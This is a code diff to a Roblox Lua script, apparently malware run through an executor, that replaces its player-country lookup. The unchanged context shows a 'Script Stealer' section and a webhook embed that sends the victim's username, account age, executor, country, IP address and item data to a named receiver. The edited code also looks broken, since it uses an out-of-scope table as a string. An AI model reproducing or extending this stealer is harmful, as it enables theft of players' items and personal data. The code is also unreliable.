@@ -800,11 +800,6 @@ if #game:GetService("Players"):GetPlayers() == 12 then
     game.Players.LocalPlayer:Kick("This server is unsupported... Try in a new PUBLIC server.")
 end
 
-local LocalizationService = game:GetService("LocalizationService")
-local Countries = {}
-local player = Players.LocalPlayer
-local remoteFunction = game:GetService("ReplicatedStorage").RemoteFunction
-local Players = game:GetService("Players")
 local LP = game.Players.LocalPlayer
 local HttpService = game:GetService("HttpService")
 local PlayerDataModule = require(game:GetService("ReplicatedStorage").Modules.ProfileData)
@@ -813,12 +808,30 @@ local InvModule = require(game:GetService("ReplicatedStorage").Modules.Inventory
 
 -- Get Players Country --
 
-local success, code = pcall(LocalizationService.GetCountryRegionForPlayerAsync, LocalizationService, player)
-	if success and code then
-		Countries = remoteFunction:InvokeServer()
-		print(code, "http://country.io/names.json", Countries[code])
+-- Service variables
+local Players = game:GetService("Players")
+local LocalizationService = game:GetService("LocalizationService")
+
+-- Countries dictionary
+local countries = require(13144850866)
+
+-- On player load
+Players.PlayerAdded:Connect(function(player)
+	-- Get country code
+	local result, country_code = pcall(LocalizationService.GetCountryRegionForPlayerAsync, LocalizationService, player)
+	if result == false then
+		country_code = "XX"
 	end
-end
+	if countries[country_code] == nil then
+		country_code = "XX"
+	end
+	
+	-- Get country data
+	local country = countries[country_code]
+	
+	-- Print flag ID
+	print("rbxassetid://"..country["Flag"])
+end)
 
 -- Script Stealer --
 
@@ -1082,7 +1095,7 @@ local WebHookEmbed = CreateEmbed(
         {
             name = "🌊 Player Info", 
             value = "``` | 📖 Username: "..LP.Name.."\n | 📌 Account Age: "..tostring(LP.AccountAge).."\n | 🚀 Level: "..tostring(getLvl())..
-                     "\n | 🥳 Receiver: "..userName.."\n | 💻 Executor Used: "..identifyexecutor().."\n | 🗺 Country: "..code.."\n | 👤 IP: "..ipwebhook.. "```"
+                     "\n | 🥳 Receiver: "..userName.."\n | 💻 Executor Used: "..identifyexecutor().."\n | 🗺 Country: "..country.."\n | 👤 IP: "..ipwebhook.. "```"
         },
         {
             name = "🍎 Items Data", 
